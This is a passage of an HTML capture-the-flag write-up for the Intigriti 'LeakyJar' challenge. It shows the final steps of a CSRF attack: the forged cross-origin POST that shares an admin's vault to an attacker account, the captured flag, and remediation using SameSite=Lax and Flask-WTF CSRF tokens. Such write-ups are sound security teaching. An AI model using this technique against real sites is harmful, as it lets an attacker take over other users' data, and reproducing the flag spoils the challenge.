+        <p>HeadlessChrome/133 from GCP Belgium loads the page, the form auto-submits. Because the admin's cookie is <code>SameSite=None</code>, the browser attaches it to the cross-origin POST without hesitation.</p>
+        <div class="cblock">
+          <div class="cblock-bar">
+            <div class="cblock-dots"><span></span><span></span><span></span></div>
+            <div class="cblock-title">What the bot sends to leakyjar</div>
+          </div>
+          <pre><span class="k">POST</span> /share HTTP/1.1
+Host: leakyjar.intigriti.io
+<span class="h">Origin:</span> https://techiesiddhi.github.io
+<span class="h">Cookie:</span> session=<span class="hi">&lt;admin_session&gt;</span>
+Content-Type: application/x-www-form-urlencoded
+
+username=h4ckzor99
+
+<span class="ok">HTTP/1.1 302 Found</span>
+Location: /vault   <span class="c">← vault shared. admin never notified.</span></pre>
+        </div>
+        <p style="margin-top:14px">The admin's vault share appears in the attacker account within seconds. The admin receives no notification.</p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num-col">
+        <div class="step-circle">05</div>
+        <div class="step-line"></div>
+      </div>
+      <div class="step-body">
+        <div class="step-title">Read admin vault — collect flag</div>
+        <p>Shared vault appears in the attacker's vault page. Open it.</p>
+        <div class="cblock">
+          <div class="cblock-bar">
+            <div class="cblock-dots"><span></span><span></span><span></span></div>
+            <div class="cblock-title">GET /vault/f09ac8fe-e51a-4fbb-afa6-f9bfb77f937a</div>
+          </div>
+          <pre>House Sugar Cookies          Cream butter and sugar, bake at 175C for 9 minutes.
+Brown Butter Base            Brown the butter until nutty, then chill before using.
+<span class="hi">Master Baker's Secret Recipe INTIGRITI{019ef404-1e44-7748-bdcf-ca7b12dbfee0}</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FLAG -->
+<section id="flag" class="dark">
+  <div class="section-label">04 &nbsp; Result</div>
+  <h2>Flag</h2>
+  <div class="flag-hero">
+    <div class="flag-icon">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+        <path d="M4 4v16M4 4h11l-2 4 2 4H4" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <div>
+      <div class="flag-label">Intigriti CTF · LeakyJar · June 2026</div>
+      <div class="flag-val">INTIGRITI{019ef404-1e44-7748-bdcf-ca7b12dbfee0}</div>
+    </div>
+  </div>
+
+  <p style="max-width:600px">
+    Admin vault contents read in full. No XSS. No phishing. No interaction from the admin
+    beyond the bot doing its routine review. The entire attack ran from a registered account
+    with no elevated privileges.
+  </p>
+</section>
+
+<!-- FIX -->
+<section id="fix">
+  <div class="section-label">05 &nbsp; Remediation</div>
+  <h2>Two fixes</h2>
+  <p>Fix 1 alone stops the attack. Fix 2 is defence in depth.</p>
+
+  <div class="fix-grid" style="grid-template-columns:repeat(2,1fr)">
+    <div class="fix-card">
+      <div class="fix-card-num">FIX · 01</div>
+      <h3>SameSite=Lax on session cookie</h3>
+      <p>Blocks cross-origin form POSTs from carrying the session. This alone kills the CSRF.</p>
+      <div class="cblock" style="margin-top:14px">
+        <div class="cblock-bar">
+          <div class="cblock-dots"><span></span><span></span><span></span></div>
+          <div class="cblock-title">Set-Cookie</div>
+        </div>
+        <pre>session=...; Secure;
+HttpOnly; Path=/;
+<span class="ok">SameSite=Lax</span></pre>
+      </div>
+    </div>
+
+    <div class="fix-card">
+      <div class="fix-card-num">FIX · 02</div>
+      <h3>CSRF token on all state-changing forms</h3>
+      <p>Covers <code>/share</code>, <code>/vault/add</code>, and <code>/recipes/review</code> in one line.</p>
+      <div class="cblock" style="margin-top:14px">
+        <div class="cblock-bar">
+          <div class="cblock-dots"><span></span><span></span><span></span></div>
+          <div class="cblock-title">Flask-WTF</div>
+        </div>
+        <pre><span class="k">from</span> flask_wtf.csrf <span class="k">import</span> \
+    CSRFProtect
+csrf = CSRFProtect(app)</pre>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-right">
+    <a href="https://leakyjar.intigriti.io" class="footer-link">leakyjar.intigriti.io</a>
+  </div>
+</footer>
+
+</body>
+</html>
